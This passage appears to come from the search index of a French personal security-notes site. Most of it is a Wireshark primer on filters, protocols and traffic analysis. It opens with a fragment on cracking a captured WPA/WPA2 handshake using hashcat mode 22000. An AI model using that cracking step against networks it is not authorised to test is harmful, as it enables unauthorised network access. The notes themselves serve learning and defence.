aurait utilis\u00e9 cap2hccapx mais maitenant le format hccapx n'est plus utilis\u00e9. Il faut le convertir en hc22000 . Je l'ai fait en utilisant un site web (pas une bonne pratique du tout, il doit exister un outil) Ensuite il faut lacer hashcat en pr\u00e9cisant le type d'attaque (bruteforce ou dictionnaire ou les 2) et le type de hash (22000 pour du wpa/wpa2). hashcat -a <type d'attaque> -m 22000 <file>.hc22000 <wordlist> Pas besoin de wordlist si l'attaque est bruteforce uniquement ( -a 3 )","title":"Crack le handshake - Bruteforce (pour mdp non conventionnels)"},{"location":"wireshark_bases/","text":"Les bases de wireshark Introduction Wireshark est un outil d'analyse de paquets r\u00e9seau. Il permet de capturer et d'analyser le trafic r\u00e9seau. Il est disponible sur Windows, Linux et Mac. * Site officiel * Download * Documentation Le mod\u00e8le OSI Le mod\u00e8le OSI est un mod\u00e8le de communication entre les ordinateurs. Il est compos\u00e9 de 7 couches : Num\u00e9ro Nom Description 7 Application Protocoles de haut niveau 6 Pr\u00e9sentation Conversion des donn\u00e9es 5 Session Gestion des sessions 4 Transport Gestion des connexions 3 R\u00e9seau Routage des paquets 2 Liaison de donn\u00e9es Gestion des erreurs 1 Physique Transmission des donn\u00e9es Exemple de protocoles par couche du mod\u00e8le OSI Num\u00e9ro Nom Protocoles 7 Application HTTP, FTP, SMTP, DNS, DHCP, SSH, Telnet, SNMP, POP3, IMAP, SMB, AFP, ... 6 Pr\u00e9sentation SSL, TLS, ... 5 Session NetBIOS, ... 4 Transport TCP, UDP, ... 3 R\u00e9seau IP, ICMP, ARP, ... 2 Liaison de donn\u00e9es Ethernet, PPP, ... 1 Physique RJ45, ... Les filtres Les filtres permettent de filtrer les paquets captur\u00e9s. Ils permettent de filtrer sur les protocoles, les adresses IP, les ports, etc. Syntaxe La syntaxe des filtres est la suivante : <protocole> <op\u00e9rateur> <valeur> Op\u00e9rateurs Il existe plusieurs op\u00e9rateurs : == : \u00e9gal \u00e0 != : diff\u00e9rent de > : sup\u00e9rieur \u00e0 < : inf\u00e9rieur \u00e0 >= : sup\u00e9rieur ou \u00e9gal \u00e0 <= : inf\u00e9rieur ou \u00e9gal \u00e0 && : ET || : OU ! : NON Exemples de filtres # Filtre sur le protocole HTTP http # Filtre sur le protocole HTTP et le port 80 http && port 80 # Filtre sur le protocole HTTP et le port 80 et l'adresse IP http && port 80 && ip.addr == <ip> # Filtre sur le protocole HTTP et le port 80 et l'adresse IP et la m\u00e9thode GET http && port 80 && ip.addr == <ip> && http.request.method == GET # Filtre sur le protocole HTTP et le port 80 et l'adresse IP et la m\u00e9thode GET et le fichier index.html http && port 80 && ip.addr == <ip> && http.request.method == GET && http.request.uri == /index.html Protocoles ARP ARP signifie Address Resolution Protocol . Il permet de faire la correspondance entre une adresse IP et une adresse MAC. C'est un protocole de la couche 3 du mod\u00e8le OSI. Ils contiennent des messages REQUEST et des messages RESPONSE. Pour identifier les paquets, l'en-t\u00eate du message contient l'un des deux codes d'op\u00e9ration suivants : * 1 : ARP Request * 2 : ARP Reply Il est utile de noter que la plupart des appareils s'identifient eux-m\u00eames ou que Wireshark les identifie, comme Intel_78 . Un exemple de trafic suspect serait de nombreuses requ\u00eates provenant d'une source non reconnue. Vous devez cependant activer un param\u00e8tre dans Wireshark pour r\u00e9soudre les adresses physiques. Pour activer cette fonction, allez dans Affichage > R\u00e9solution des noms > Assurez-vous que l'option R\u00e9soudre les adresses physiques est coch\u00e9e. Exemple de paquet ARP En regardant les d\u00e9tails du paquet ci-dessus, les d\u00e9tails les plus importants du paquet sont soulign\u00e9s en rouge. * L'Opcode est l'abr\u00e9viation de code d'op\u00e9ration et indique s'il s'agit d'une requ\u00eate ou d'une r\u00e9ponse ARP. * La cible du paquet, qui dans ce cas, est une demande de diffusion \u00e0 tous. En regardant les d\u00e9tails du paquet ci-dessus, nous pouvons voir d'apr\u00e8s l'Opcode qu'il s'agit d'un paquet ARP Reply. Nous pouvons \u00e9galement obtenir d'autres informations utiles telles que les adresses MAC et IP qui ont \u00e9t\u00e9 envoy\u00e9es avec la r\u00e9ponse, puisqu'il s'agit d'un paquet de r\u00e9ponse, nous savons qu'il s'agit des informations envoy\u00e9es avec le message. ARP est l'un des protocoles les plus simples \u00e0 analyser, tout ce dont vous devez vous souvenir est d'identifier s'il s'agit d'un paquet de demande ou de r\u00e9ponse et par qui il est envoy\u00e9. Liste des filtres pour le protocole ARP : https://www.wireshark.org/docs/dfref/a/arp.html ICMP ICMP signifie Internet Control Message Protocol . Il permet de faire des requ\u00eates et des r\u00e9ponses pour tester la connectivit\u00e9 entre deux h\u00f4tes. C'est un protocole de la couche 3 du mod\u00e8le OSI. Il est tr\u00e8s connu car c'est le protocole associ\u00e9 \u00e0 la commande ping . Les paquets ICMP ont une structure similaire \u00e0 celle des paquets IP. Ils contiennent des messages REQUEST et des messages RESPONSE. Pour identifier les paquets, l'en-t\u00eate du message contient l'un des deux codes d'op\u00e9ration suivants ( type ): 8 : ICMP Request 0 : ICMP Reply Si ces codes sont modifi\u00e9s ou ne semblent pas corrects, il s'agit g\u00e9n\u00e9ralement d'un signe d'activit\u00e9 suspecte. TCP TCP signifie Transmission Control Protocol . Il permet de faire des connexions entre deux h\u00f4tes. C'est un protocole de la couche 4 du mod\u00e8le OSI. Lors de l'analyse des paquets TCP, Wireshark peut \u00eatre tr\u00e8s utile et coder les paquets par couleur en fonction du niveau de danger . Si vous ne vous souvenez pas du code couleur, relisez la documentation de wireshark et rafra\u00eechissez vos connaissances sur la fa\u00e7on dont Wireshark utilise les couleurs pour faire correspondre les paquets. TCP peut donner un aper\u00e7u utile d'un r\u00e9seau lorsqu'il est analys\u00e9, mais il peut aussi \u00eatre difficile \u00e0 analyser en raison du nombre de paquets qu'il envoie. C'est l\u00e0 que vous devrez peut-\u00eatre utiliser d'autres outils tels que RSA NetWitness et NetworkMiner pour filtrer et analyser davantage les captures. Analyse des paquets TCP Pour analyser les paquets TCP, nous n'entrerons pas dans les d\u00e9tails de chacun d'entre eux, mais nous examinerons quelques-uns de leurs comportements et de leurs structures. Ci-dessous, nous voyons les d\u00e9tails d'un paquet SYN. La principale chose que nous voulons observer dans un paquet TCP est le num\u00e9ro de s\u00e9quence et le num\u00e9ro d'accus\u00e9 de r\u00e9ception. Ceux-ci sont utilis\u00e9s pour identifier les paquets et les connexions TCP : * Le num\u00e9ro de s\u00e9quence ( sequence number ) est le num\u00e9ro de s\u00e9quence du paquet * Le num\u00e9ro d'accus\u00e9 de r\u00e9ception ( Acknowledgment number ) est le num\u00e9ro de s\u00e9quence du paquet suivant que l'h\u00f4te attend de recevoir. Cela permet de s'assurer que les paquets sont re\u00e7us dans le bon ordre et qu'aucun paquet n'est perdu. Dans Wireshark, nous pouvons \u00e9galement voir le num\u00e9ro de s\u00e9quence original en naviguant vers edit > preferences > protocols > TCP > relative sequence numbers (uncheck boxes). En r\u00e8gle g\u00e9n\u00e9rale, les paquets TCP doivent \u00eatre examin\u00e9s dans leur ensemble pour raconter une histoire, plut\u00f4t que d'\u00eatre examin\u00e9s un par un dans les d\u00e9tails. DNS DNS signifie Domain Name System . Il permet de faire la correspondance entre un nom de domaine et une adresse IP. C'est un protocole de la couche 7 du mod\u00e8le OSI. Port DNS Le port DNS est le port 53. C'est du TCP/IP. Requ\u00eate DNS Les requ\u00eates DNS sont des requ\u00eates envoy\u00e9es par un client DNS \u00e0 un serveur DNS. Elles sont envoy\u00e9es sur le port 53 en UDP ou TCP. Elles sont compos\u00e9es d'un en-t\u00eate et d'une question. L'en-t\u00eate contient les informations suivantes : * ID : identifiant de la requ\u00eate * QR : 0 pour une requ\u00eate, 1 pour une r\u00e9ponse * Opcode : 0 pour une requ\u00eate standard * AA : 1 si le serveur est autoritaire pour le domaine * TC : 1 si le message est tronqu\u00e9 * RD : 1 si le client souhaite une requ\u00eate r\u00e9cursive * RA : 1 si le serveur peut faire une requ\u00eate r\u00e9cursive * Z : 0 * RCODE : 0 si la requ\u00eate est r\u00e9ussie Points suspects dans les paquets DNS Vous devez garder \u00e0 l'esprit un certain nombre d'\u00e9l\u00e9ments d\u00e9crits ci-dessous lorsque vous analysez des paquets DNS. Query-Response DNS-Server Only UDP Si l'un de ces \u00e9l\u00e9ments n'est pas \u00e0 sa place, les paquets doivent faire l'objet d'un examen plus approfondi et \u00eatre consid\u00e9r\u00e9s comme suspects. HTTP HTTP signifie HyperText Transfer Protocol . Il permet de faire des requ\u00eates et des r\u00e9ponses pour r\u00e9cup\u00e9rer des pages web. C'est un protocole de la couche 7 du mod\u00e8le OSI. HTTP est l'un des protocoles les plus directs pour l'analyse des paquets. Le protocole va droit au but et n'inclut pas de poign\u00e9e de main ou de conditions pr\u00e9alables \u00e0 la communication. HTTP n'est pas un protocole que l'on voit beaucoup, car HTTPS est d\u00e9sormais plus couramment utilis\u00e9 ; cependant, HTTP est encore souvent utilis\u00e9 et peut \u00eatre tr\u00e8s facile \u00e0 analyser si l'on en a l'occasion. Port HTTP Le port HTTP est le port 80. C'est du TCP/IP. Requ\u00eate HTTP Les requ\u00eates HTTP sont des requ\u00eates envoy\u00e9es par un client HTTP \u00e0 un serveur HTTP. Elles sont envoy\u00e9es sur le port 80 en TCP. Elles sont compos\u00e9es d'une ligne de requ\u00eate, d'en-t\u00eates et d'un corps. La ligne de requ\u00eate contient les informations suivantes : M\u00e9thode : GET, POST, PUT, DELETE, ... URI : Uniform Resource Identifier Version : HTTP/1.1, HTTP/2, ... Analyse de paquets HTTP HTTP est utilis\u00e9 pour envoyer des requ\u00eates GET et POST \u00e0 un serveur web afin de recevoir des choses telles que des pages web. Savoir analyser HTTP peut \u00eatre utile pour rep\u00e9rer rapidement des \u00e9l\u00e9ments tels que SQLi, les Web Shells et d'autres vecteurs d'attaque li\u00e9s au web. Lorsque vous analysez des paquets HTTP, vous devez vous concentrer sur les \u00e9l\u00e9ments suivants : Element Description M\u00e9thode La m\u00e9thode utilis\u00e9e pour la requ\u00eate. Les m\u00e9thodes les plus courantes sont GET et POST. URI L'URI est l'adresse de la page web demand\u00e9e. Version La version du protocole HTTP utilis\u00e9e. Les versions les plus courantes sont HTTP/1.1 et HTTP/2. Host L'h\u00f4te est l'adresse IP du serveur web. User-Agent Le User-Agent est le navigateur utilis\u00e9 pour envoyer la requ\u00eate. Accept L'Accept est le type de donn\u00e9es accept\u00e9es par le navigateur. Cookie Le Cookie est le cookie envoy\u00e9 par le navigateur. HTTPS HTTPS signifie HyperText Transfer Protocol Secure . Il permet de faire des requ\u00eates et des r\u00e9ponses pour r\u00e9cup\u00e9rer des pages web. C'est un protocole de la couche 7 du mod\u00e8le OSI. HTTPS est une version s\u00e9curis\u00e9e de HTTP. Il utilise le protocole TLS pour s\u00e9curiser les communications. Il est donc plus difficile \u00e0 analyser que HTTP.Il peut \u00eatre l'un des protocoles les plus difficiles \u00e0 comprendre du point de vue de l'analyse des paquets et il peut \u00eatre d\u00e9routant de comprendre les \u00e9tapes \u00e0 suivre pour analyser les paquets HTTPS. Cr\u00e9ation d'un tunnel s\u00e9curis\u00e9 HTTPS Lorsqu'un client se connecte \u00e0 un serveur HTTPS, il doit d'abord \u00e9tablir une connexion TCP/IP avec le serveur. Une fois la connexion TCP/IP \u00e9tablie, le client et le serveur doivent \u00e9tablir une connexion TLS. Pour ce faire, le client et le serveur doivent n\u00e9gocier les param\u00e8tres de la connexion TLS. Une fois la connexion TLS \u00e9tablie, le client et le serveur peuvent commencer \u00e0 communiquer en utilisant le protocole HTTP. Etapes : Le client et le serveur conviennent d'une version du protocole Le client et le serveur s\u00e9lectionnent un algorithme cryptographique Le client et le serveur peuvent s'authentifier l'un l'autre ; cette \u00e9tape est facultative. Cr\u00e9ation d'un tunnel s\u00e9curis\u00e9 avec une cl\u00e9 publique Analyse des paquets HTTPS Les paquets HTTPS s'analysent comme ceux HTTP \u00e0 la diff\u00e9rence pr\u00e8s qu'il faut entrer la cl\u00e9 de chiffrement dans wireshark afin de d\u00e9chiffrer les messages. Pour cela, il faut aller dans Edit > Preferences > Protocols > TLS > Edit > + > Protocol : http > Key File : > Password : . Exemple de configuration de la cl\u00e9 : IP address : 127.0.0.1 Port : start_tls Protocol : http Key File : Password : Outils d'analyse wiresark Organiser la Hierarchie des protocoles Nous pouvons utiliser certaines des fonctions int\u00e9gr\u00e9es de Wireshark pour nous aider \u00e0 assimiler toutes ces donn\u00e9es et \u00e0 les organiser en vue d'une analyse ult\u00e9rieure . Nous pouvons commencer par examiner une fonction tr\u00e8s utile de Wireshark pour organiser les protocoles pr\u00e9sents dans une capture, \u00e0 savoir la Hi\u00e9rarchie des protocoles . Naviguez vers Statistiques > Hi\u00e9rarchie des protocoles . Ces informations peuvent \u00eatre tr\u00e8s utiles dans des applications pratiques telles que la chasse aux menaces pour identifier les divergences dans les captures de paquets. Organiser les URI La prochaine fonctionnalit\u00e9 de Wireshark que nous allons examiner est l'exportation d'objets HTTP. Cette fonction nous permettra d' organiser tous les URI demand\u00e9s dans la capture. Pour utiliser Export HTTP Object, naviguez vers File > Export Objects > HTTP . Comme pour la hi\u00e9rarchie des protocoles, cela peut \u00eatre utile pour identifier rapidement d'\u00e9ventuelles divergences dans les captures. Points de terminaison ou Endpoint La fonction points de terminaison (Endpoint) permet \u00e0 l'utilisateur d'organiser tous les points de terminaison et toutes les adresses IP trouv\u00e9s dans une capture sp\u00e9cifique. Tout comme les autres fonctionnalit\u00e9s, elle peut \u00eatre utile pour identifier l'origine d'une anomalie. Pour utiliser la fonction Points d'extr\u00e9mit\u00e9, acc\u00e9dez \u00e0 Statistiques > Points d'extr\u00e9mit\u00e9 . Organiser les flux de donn\u00e9es Afin d'organiser le flux de donn\u00e9es, nous pouvons utliser la fonction d'exportation d'objets HTTP. Pour acc\u00e9der \u00e0 cette fonction, naviguez vers Fichier > Exporter des objets > HTTP.","title":"Les bases"},{"location":"wireshark_bases/#les-bases-de-wireshark","text":"","title":"Les bases de wireshark"},{"location":"wireshark_bases/#introduction","text":"Wireshark est un outil d'analyse de paquets r\u00e9seau. Il permet de capturer et d'analyser le trafic r\u00e9seau. Il est disponible sur Windows, Linux et Mac. * Site officiel * Download * Documentation","title":"Introduction"},{"location":"wireshark_bases/#le-modele-osi","text":"Le mod\u00e8le OSI est un mod\u00e8le de communication entre les ordinateurs. Il est compos\u00e9 de 7 couches : Num\u00e9ro Nom Description 7 Application Protocoles de haut niveau 6 Pr\u00e9sentation Conversion des donn\u00e9es 5 Session Gestion des sessions 4 Transport Gestion des connexions 3 R\u00e9seau Routage des paquets 2 Liaison de donn\u00e9es Gestion des erreurs 1 Physique Transmission des donn\u00e9es","title":"Le mod\u00e8le OSI"},{"location":"wireshark_bases/#exemple-de-protocoles-par-couche-du-modele-osi","text":"Num\u00e9ro Nom Protocoles 7 Application HTTP, FTP, SMTP, DNS, DHCP, SSH, Telnet, SNMP, POP3, IMAP, SMB, AFP, ... 6 Pr\u00e9sentation SSL, TLS, ... 5 Session NetBIOS, ... 4 Transport TCP, UDP, ... 3 R\u00e9seau IP, ICMP, ARP, ... 2 Liaison de donn\u00e9es Ethernet, PPP, ... 1 Physique RJ45, ...","title":"Exemple de protocoles par couche du mod\u00e8le OSI"},{"location":"wireshark_bases/#les-filtres","text":"Les filtres permettent de filtrer les paquets captur\u00e9s. Ils permettent de filtrer sur les protocoles, les adresses IP, les ports, etc.","title":"Les filtres"},{"location":"wireshark_bases/#syntaxe","text":"La syntaxe des filtres est la suivante : <protocole> <op\u00e9rateur> <valeur>","title":"Syntaxe"},{"location":"wireshark_bases/#operateurs","text":"Il existe plusieurs op\u00e9rateurs : == : \u00e9gal \u00e0 != : diff\u00e9rent de > : sup\u00e9rieur \u00e0 < : inf\u00e9rieur \u00e0 >= : sup\u00e9rieur ou \u00e9gal \u00e0 <= : inf\u00e9rieur ou \u00e9gal \u00e0 && : ET || : OU ! : NON","title":"Op\u00e9rateurs"},{"location":"wireshark_bases/#exemples-de-filtres","text":"# Filtre sur le protocole HTTP http # Filtre sur le protocole HTTP et le port 80 http && port 80 # Filtre sur le protocole HTTP et le port 80 et l'adresse IP http && port 80 && ip.addr == <ip> # Filtre sur le protocole HTTP et le port 80 et l'adresse IP et la m\u00e9thode GET http && port 80 && ip.addr == <ip> && http.request.method == GET # Filtre sur le protocole HTTP et le port 80 et l'adresse IP et la m\u00e9thode GET et le fichier index.html http && port 80 && ip.addr == <ip> && http.request.method == GET && http.request.uri == /index.html","title":"Exemples de filtres"},{"location":"wireshark_bases/#protocoles","text":"","title":"Protocoles"},{"location":"wireshark_bases/#arp","text":"ARP signifie Address Resolution Protocol . Il permet de faire la correspondance entre une adresse IP et une adresse MAC. C'est un protocole de la couche 3 du mod\u00e8le OSI. Ils contiennent des messages REQUEST et des messages RESPONSE. Pour identifier les paquets, l'en-t\u00eate du message contient l'un des deux codes d'op\u00e9ration suivants : * 1 : ARP Request * 2 : ARP Reply Il est utile de noter que la plupart des appareils s'identifient eux-m\u00eames ou que Wireshark les identifie, comme Intel_78 . Un exemple de trafic suspect serait de nombreuses requ\u00eates provenant d'une source non reconnue. Vous devez cependant activer un param\u00e8tre dans Wireshark pour r\u00e9soudre les adresses physiques. Pour activer cette fonction, allez dans Affichage > R\u00e9solution des noms > Assurez-vous que l'option R\u00e9soudre les adresses physiques est coch\u00e9e.","title":"ARP"},{"location":"wireshark_bases/#exemple-de-paquet-arp","text":"En regardant les d\u00e9tails du paquet ci-dessus, les d\u00e9tails les plus importants du paquet sont soulign\u00e9s en rouge. * L'Opcode est l'abr\u00e9viation de code d'op\u00e9ration et indique s'il s'agit d'une requ\u00eate ou d'une r\u00e9ponse ARP. * La cible du paquet, qui dans ce cas, est une demande de diffusion \u00e0 tous. En regardant les d\u00e9tails du paquet ci-dessus, nous pouvons voir d'apr\u00e8s l'Opcode qu'il s'agit d'un paquet ARP Reply. Nous pouvons \u00e9galement obtenir d'autres informations utiles telles que les adresses MAC et IP qui ont \u00e9t\u00e9 envoy\u00e9es avec la r\u00e9ponse, puisqu'il s'agit d'un paquet de r\u00e9ponse, nous savons qu'il s'agit des informations envoy\u00e9es avec le message. ARP est l'un des protocoles les plus simples \u00e0 analyser, tout ce dont vous devez vous souvenir est d'identifier s'il s'agit d'un paquet de demande ou de r\u00e9ponse et par qui il est envoy\u00e9. Liste des filtres pour le protocole ARP : https://www.wireshark.org/docs/dfref/a/arp.html","title":"Exemple de paquet ARP"},{"location":"wireshark_bases/#icmp","text":"ICMP signifie Internet Control Message Protocol . Il permet de faire des requ\u00eates et des r\u00e9ponses pour tester la connectivit\u00e9 entre deux h\u00f4tes. C'est un protocole de la couche 3 du mod\u00e8le OSI. Il est tr\u00e8s connu car c'est le protocole associ\u00e9 \u00e0 la commande ping . Les paquets ICMP ont une structure similaire \u00e0 celle des paquets IP. Ils contiennent des messages REQUEST et des messages RESPONSE. Pour identifier les paquets, l'en-t\u00eate du message contient l'un des deux codes d'op\u00e9ration suivants ( type ): 8 : ICMP Request 0 : ICMP Reply Si ces codes sont modifi\u00e9s ou ne semblent pas corrects, il s'agit g\u00e9n\u00e9ralement d'un signe d'activit\u00e9 suspecte.","title":"ICMP"},{"location":"wireshark_bases/#tcp","text":"TCP signifie Transmission Control Protocol . Il permet de faire des connexions entre deux h\u00f4tes. C'est un protocole de la couche 4 du mod\u00e8le OSI. Lors de l'analyse des paquets TCP, Wireshark peut \u00eatre tr\u00e8s utile et coder les paquets par couleur en fonction du niveau de danger . Si vous ne vous souvenez pas du code couleur, relisez la documentation de wireshark et rafra\u00eechissez vos connaissances sur la fa\u00e7on dont Wireshark utilise les couleurs pour faire correspondre les paquets. TCP peut donner un aper\u00e7u utile d'un r\u00e9seau lorsqu'il est analys\u00e9, mais il peut aussi \u00eatre difficile \u00e0 analyser en raison du nombre de paquets qu'il envoie. C'est l\u00e0 que vous devrez peut-\u00eatre utiliser d'autres outils tels que RSA NetWitness et NetworkMiner pour filtrer et analyser davantage les captures.","title":"TCP"},{"location":"wireshark_bases/#analyse-des-paquets-tcp","text":"Pour analyser les paquets TCP, nous n'entrerons pas dans les d\u00e9tails de chacun d'entre eux, mais nous examinerons quelques-uns de leurs comportements et de leurs structures. Ci-dessous, nous voyons les d\u00e9tails d'un paquet SYN. La principale chose que nous voulons observer dans un paquet TCP est le num\u00e9ro de s\u00e9quence et le num\u00e9ro d'accus\u00e9 de r\u00e9ception. Ceux-ci sont utilis\u00e9s pour identifier les paquets et les connexions TCP : * Le num\u00e9ro de s\u00e9quence ( sequence number ) est le num\u00e9ro de s\u00e9quence du paquet * Le num\u00e9ro d'accus\u00e9 de r\u00e9ception ( Acknowledgment number ) est le num\u00e9ro de s\u00e9quence du paquet suivant que l'h\u00f4te attend de recevoir. Cela permet de s'assurer que les paquets sont re\u00e7us dans le bon ordre et qu'aucun paquet n'est perdu. Dans Wireshark, nous pouvons \u00e9galement voir le num\u00e9ro de s\u00e9quence original en naviguant vers edit > preferences > protocols > TCP > relative sequence numbers (uncheck boxes). En r\u00e8gle g\u00e9n\u00e9rale, les paquets TCP doivent \u00eatre examin\u00e9s dans leur ensemble pour raconter une histoire, plut\u00f4t que d'\u00eatre examin\u00e9s un par un dans les d\u00e9tails.","title":"Analyse des paquets TCP"},{"location":"wireshark_bases/#dns","text":"DNS signifie Domain Name System . Il permet de faire la correspondance entre un nom de domaine et une adresse IP. C'est un protocole de la couche 7 du mod\u00e8le OSI.","title":"DNS"},{"location":"wireshark_bases/#port-dns","text":"Le port DNS est le port 53. C'est du TCP/IP.","title":"Port DNS"},{"location":"wireshark_bases/#requete-dns","text":"Les requ\u00eates DNS sont des requ\u00eates envoy\u00e9es par un client DNS \u00e0 un serveur DNS. Elles sont envoy\u00e9es sur le port 53 en UDP ou TCP. Elles sont compos\u00e9es d'un en-t\u00eate et d'une question. L'en-t\u00eate contient les informations suivantes : * ID : identifiant de la requ\u00eate * QR : 0 pour une requ\u00eate, 1 pour une r\u00e9ponse * Opcode : 0 pour une requ\u00eate standard * AA : 1 si le serveur est autoritaire pour le domaine * TC : 1 si le message est tronqu\u00e9 * RD : 1 si le client souhaite une requ\u00eate r\u00e9cursive * RA : 1 si le serveur peut faire une requ\u00eate r\u00e9cursive * Z : 0 * RCODE : 0 si la requ\u00eate est r\u00e9ussie","title":"Requ\u00eate DNS"},{"location":"wireshark_bases/#points-suspects-dans-les-paquets-dns","text":"Vous devez garder \u00e0 l'esprit un certain nombre d'\u00e9l\u00e9ments d\u00e9crits ci-dessous lorsque vous analysez des paquets DNS. Query-Response DNS-Server Only UDP Si l'un de ces \u00e9l\u00e9ments n'est pas \u00e0 sa place, les paquets doivent faire l'objet d'un examen plus approfondi et \u00eatre consid\u00e9r\u00e9s comme suspects.","title":"Points suspects dans les paquets DNS"},{"location":"wireshark_bases/#http","text":"HTTP signifie HyperText Transfer Protocol . Il permet de faire des requ\u00eates et des r\u00e9ponses pour r\u00e9cup\u00e9rer des pages web. C'est un protocole de la couche 7 du mod\u00e8le OSI. HTTP est l'un des protocoles les plus directs pour l'analyse des paquets. Le protocole va droit au but et n'inclut pas de poign\u00e9e de main ou de conditions pr\u00e9alables \u00e0 la communication. HTTP n'est pas un protocole que l'on voit beaucoup, car HTTPS est d\u00e9sormais plus couramment utilis\u00e9 ; cependant, HTTP est encore souvent utilis\u00e9 et peut \u00eatre tr\u00e8s facile \u00e0 analyser si l'on en a l'occasion.","title":"HTTP"},{"location":"wireshark_bases/#port-http","text":"Le port HTTP est le port 80. C'est du TCP/IP.","title":"Port HTTP"},{"location":"wireshark_bases/#requete-http","text":"Les requ\u00eates HTTP sont des requ\u00eates envoy\u00e9es par un client HTTP \u00e0 un serveur HTTP. Elles sont envoy\u00e9es sur le port 80 en TCP. Elles sont compos\u00e9es d'une ligne de requ\u00eate, d'en-t\u00eates et d'un corps. La ligne de requ\u00eate contient les informations suivantes : M\u00e9thode : GET, POST, PUT, DELETE, ... URI : Uniform Resource Identifier Version : HTTP/1.1, HTTP/2, ...","title":"Requ\u00eate HTTP"},{"location":"wireshark_bases/#analyse-de-paquets-http","text":"HTTP est utilis\u00e9 pour envoyer des requ\u00eates GET et POST \u00e0 un serveur web afin de recevoir des choses telles que des pages web. Savoir analyser HTTP peut \u00eatre utile pour rep\u00e9rer rapidement des \u00e9l\u00e9ments tels que SQLi, les Web Shells et d'autres vecteurs d'attaque li\u00e9s au web. Lorsque vous analysez des paquets HTTP, vous devez vous concentrer sur les \u00e9l\u00e9ments suivants : Element Description M\u00e9thode La m\u00e9thode utilis\u00e9e pour la requ\u00eate. Les m\u00e9thodes les plus courantes sont GET et POST. URI L'URI est l'adresse de la page web demand\u00e9e. Version La version du protocole HTTP utilis\u00e9e. Les versions les plus courantes sont HTTP/1.1 et HTTP/2. Host L'h\u00f4te est l'adresse IP du serveur web. User-Agent Le User-Agent est le navigateur utilis\u00e9 pour envoyer la requ\u00eate. Accept L'Accept est le type de donn\u00e9es accept\u00e9es par le navigateur. Cookie Le Cookie est le cookie envoy\u00e9 par le navigateur.","title":"Analyse de paquets HTTP"},{"location":"wireshark_bases/#https","text":"HTTPS signifie HyperText Transfer Protocol Secure . Il permet de faire des requ\u00eates et des r\u00e9ponses pour r\u00e9cup\u00e9rer des pages web. C'est un protocole de la couche 7 du mod\u00e8le OSI. HTTPS est une version s\u00e9curis\u00e9e de HTTP. Il utilise le protocole TLS pour s\u00e9curiser les communications. Il est donc plus difficile \u00e0 analyser que HTTP.Il peut \u00eatre l'un des protocoles les plus difficiles \u00e0 comprendre du point de vue de l'analyse des paquets et il peut \u00eatre d\u00e9routant de comprendre les \u00e9tapes \u00e0 suivre pour analyser les paquets HTTPS.","title":"HTTPS"},{"location":"wireshark_bases/#creation-dun-tunnel-securise-https","text":"Lorsqu'un client se connecte \u00e0 un serveur HTTPS, il doit d'abord \u00e9tablir une connexion TCP/IP avec le serveur. Une fois la connexion TCP/IP \u00e9tablie, le client et le serveur doivent \u00e9tablir une connexion TLS. Pour ce faire, le client et le serveur doivent n\u00e9gocier les param\u00e8tres de la connexion TLS. Une fois la connexion TLS \u00e9tablie, le client et le serveur peuvent commencer \u00e0 communiquer en utilisant le protocole HTTP. Etapes : Le client et le serveur conviennent d'une version du protocole Le client et le serveur s\u00e9lectionnent un algorithme cryptographique Le client et le serveur peuvent s'authentifier l'un l'autre ; cette \u00e9tape est facultative. Cr\u00e9ation d'un tunnel s\u00e9curis\u00e9 avec une cl\u00e9 publique","title":"Cr\u00e9ation d'un tunnel s\u00e9curis\u00e9 HTTPS"},{"location":"wireshark_bases/#analyse-des-paquets-https","text":"Les paquets HTTPS s'analysent comme ceux HTTP \u00e0 la diff\u00e9rence pr\u00e8s qu'il faut entrer la cl\u00e9 de chiffrement dans wireshark afin de d\u00e9chiffrer les messages. Pour cela, il faut aller dans Edit > Preferences > Protocols > TLS > Edit > + > Protocol : http > Key File : > Password : . Exemple de configuration de la cl\u00e9 : IP address : 127.0.0.1 Port : start_tls Protocol : http Key File : Password :","title":"Analyse des paquets HTTPS"},{"location":"wireshark_bases/#outils-danalyse-wiresark","text":"","title":"Outils d'analyse wiresark"},{"location":"wireshark_bases/#organiser-la-hierarchie-des-protocoles","text":"Nous pouvons utiliser certaines des fonctions int\u00e9gr\u00e9es de Wireshark pour nous aider \u00e0 assimiler toutes ces donn\u00e9es et \u00e0 les organiser en vue d'une analyse ult\u00e9rieure . Nous pouvons commencer par examiner une fonction tr\u00e8s utile de Wireshark pour organiser les protocoles pr\u00e9sents dans une capture, \u00e0 savoir la Hi\u00e9rarchie des protocoles . Naviguez vers Statistiques > Hi\u00e9rarchie des protocoles . Ces informations peuvent \u00eatre tr\u00e8s utiles dans des applications pratiques telles que la chasse aux menaces pour identifier les divergences dans les captures de paquets.","title":"Organiser la Hierarchie des protocoles"},{"location":"wireshark_bases/#organiser-les-uri","text":"La prochaine fonctionnalit\u00e9 de Wireshark que nous allons examiner est l'exportation d'objets HTTP. Cette fonction nous permettra d' organiser tous les URI demand\u00e9s dans la capture. Pour utiliser Export HTTP Object, naviguez vers File > Export Objects > HTTP . Comme pour la hi\u00e9rarchie des protocoles, cela peut \u00eatre utile pour identifier rapidement d'\u00e9ventuelles divergences dans les captures.","title":"Organiser les URI"},{"location":"wireshark_bases/#points-de-terminaison-ou-endpoint","text":"La fonction points de terminaison (Endpoint) permet \u00e0 l'utilisateur d'organiser tous les points de terminaison et toutes les adresses IP trouv\u00e9s dans une capture sp\u00e9cifique. Tout comme les autres fonctionnalit\u00e9s, elle peut \u00eatre utile pour identifier l'origine d'une anomalie. Pour utiliser la fonction Points d'extr\u00e9mit\u00e9, acc\u00e9dez \u00e0 Statistiques > Points d'extr\u00e9mit\u00e9 .","title":"Points de terminaison ou Endpoint"},{"location":"wireshark_bases/#organiser-les-flux-de-donnees","text":"Afin d'organiser le flux de donn\u00e9es, nous pouvons utliser la fonction d'exportation d'objets HTTP. Pour acc\u00e9der \u00e0 cette fonction, naviguez vers Fichier > Exporter des objets > HTTP.","title":"Organiser les flux de donn\u00e9es"}]}